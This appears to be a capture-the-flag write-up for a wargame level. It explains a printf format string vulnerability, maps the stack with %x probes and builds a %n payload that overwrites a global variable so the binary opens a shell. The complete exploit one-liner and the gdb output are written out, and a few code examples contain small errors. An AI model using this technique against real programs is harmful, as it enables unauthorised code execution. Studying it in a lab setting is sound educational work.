#include <stdio.h>
#include <stdlib.h>

// Global variable used for the flag/win condition check
int m = 0; 

void v(void) {
    char local_20c[520];
    
    // Reads up to 512 (0x200) bytes into the buffer
    fgets(local_20c, 0x200, stdin);
    
    // VULNERABILITY: Classic format string bug here!
    // It passes user input directly to printf without a format specifier like %s.
    printf(local_20c);
    
    // 0x40 is 64 in decimal. 
    // The goal of this challenge is likely to use the format string vulnerability 
    // above to overwrite the global variable 'm' in memory to equal 64.
    if (m == 0x40) {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}

int main(void) {
    v();
    return 0;
}


lets start doing the typicall recognition

===== info functions (what functions exist?) =====
All defined functions:

Non-debugging symbols:
0x08048344  _init
0x08048390  printf
0x08048390  printf@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  fwrite
0x080483b0  fwrite@plt
0x080483c0  system
0x080483c0  system@plt
0x080483d0  __gmon_start__
0x080483d0  __gmon_start__@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  v
0x0804851a  main
0x08048530  __libc_csu_init
0x080485a0  __libc_csu_fini
0x080485a2  __i686.get_pc_thunk.bx
0x080485b0  __do_global_ctors_aux
0x080485dc  _fini

===== disassemble main (the entry logic) =====
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.


(gdb) info function main
All functions matching regular expression "main":

Non-debugging symbols:
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x0804851a  main
(gdb) info variable m
All variables matching regular expression "m":

Non-debugging symbols:
0x08049884  completed.6159
0x0804988c  m


okay, now as we can see we got the m adress where we will need to change the value in order to pass the script,

now the thing is, we cannot see the overflow input

what i meant by this,

lets analyze the code a bit, 

void v(void) {
    char local_20c[520];

    fgets(local_20c, 0x200, stdin);

    printf(local_20c);

    if (m == 0x40) {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}
k

here we got a fgets, not a gets like the code before, this is problematic because it is checking the lenght 0x200, and we cannot bypass that to do a buffer overflow to the unprotected m global and break that, so we need something else, and we got it, the printf

now this is a new game mechanic so hear me out a bit, focus!!, 

we got two new flags in the printf 

the %n flag and the %$ flag,

we are going to see how this flags normally work so we can exploit them when someone write a bad printf like the one we are seen here

so the thing is 

the %n is the most weird flag of them all, it writes to the memory the nnumber of chars before the flag

so for example if i put

1234%n the n value will be 4, now we must give a adress so it can write into the memory,

so the whole program should be something like

int counter = 0;

// we are just counting the chars in 'this phrase got :'
printf("this phrase got :%n, &counter);

printf(" %d number of chars\n, counter);

so we can save the value in a variable,

the next mechanic is %number$

like %4$ or %5$

what this flag does?
just refer to the number of the argument in the va_arg, so we can custom the output like

char *str1 = "here is the str1\n";
char *str2 = "here is the str2\n";
char *str3 = "here is the str3\n";
char *str4 = "here is the str4\n";

printf("this is the string4: %4$d", str1, str2, str3, str4);

annd thhe result whill be:
this is the string4: here is the str4

so yeah we can refer to exactly the number of argument we want

but this got a catch, if we got arguments!!! if dont we are just going to start bypassing the printf boundarys and start searching the stack to print, and we are going to do exactly that


so now we got both mechannics first lets see how the stack is made, and where our printf intput is being put 

the process of the program is the following,

take the input (with a cap in the lenght)

print the input literally,

so lets map how the heap is being displayed

to do that lets put a bunch of %x %x %x to map the values in the stack in a visible way


as we can see in the output 
level3@RainFall:~$ ./level3 
%x %x %x %x %x %x %x %x %x %x %x %x
200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a782520

at some point we are mirroring the input of the print f in memory 

25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a782520

te be even more sure we can put some kind of mark to know where we at, like for example a aaaa

level3@RainFall:~$ ./level3 
aaaa %x %x %x %x %x %x %x %x %x %x %x %x
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825

as you can see in the argument number 4 we are seeing the 61616161, we see the stack as arguments because the printf was not protected doing the 

printf(%s, buffer)

so we can explore the whole stack and its values,

so we can see in the 61616161 we are starting our printf input argument

so lets use this to exploit the system, 

we need to write 64 into the global var m, we got the adress of m

level3@RainFall:~$ gdb level3
(gdb) info variable m
All variables matching regular expression "m":

Non-debugging symbols:
0x08049884  completed.6159
0x0804988c  m


so lets build the payload 

the adress = 0x0804988c 
the value needed = 64
and the flags to read the n argument and write there the value
%(number)$n
the offset in the stack for our printf intput
is 4

so 

0804988c

python -c 'print "\x08\x04\x98\x8c"[::-1] + "A"*60 + "%4$n"' > payload




